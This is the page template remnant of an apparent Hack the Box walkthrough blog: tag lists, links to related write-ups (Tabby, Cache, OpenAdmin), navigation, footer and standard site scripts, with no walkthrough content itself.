Walkthrough</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/blog/">blog</a> <a class="post-tag" href="/tags/c/">c</a> <a class="post-tag" href="/tags/discovery/">discovery</a> <a class="post-tag" href="/tags/edr/">edr</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTB-Tabby/"><div class="card-body"> <em class="timeago small" data-ts="1593626400" > 2020-07-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Tabby</h3><div class="text-muted small"><p> This is my write up for the HackTheBox Linux machine Tabby. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t at...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Cache/"><div class="card-body"> <em class="timeago small" data-ts="1593885600" > 2020-07-04 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Cache</h3><div class="text-muted small"><p> This is my guide to the HackTheBox Linux machine Cache. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-OpenAdmin/"><div class="card-body"> <em class="timeago small" data-ts="1585332000" > 2020-03-27 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - OpenAdmin</h3><div class="text-muted small"><p> This write-up is an attempt to show my process of achieving root in the HackTheBox machine OpenAdmin. These HTB writeups have been migrated from a standalone repository for ease of access. Ho...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTB-Resolute/" class="btn btn-outline-primary" prompt="Older"><p>Hack the Box - Resolute</p></a> <a href="/posts/HTB-Admirer/" class="btn btn-outline-primary" prompt="Newer"><p>Hack the Box - Admirer</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/username">Chris</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/blog/">blog</a> <a class="post-tag" href="/tags/c/">c</a> <a class="post-tag" href="/tags/discovery/">discovery</a> <a class="post-tag" href="/tags/edr/">edr</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
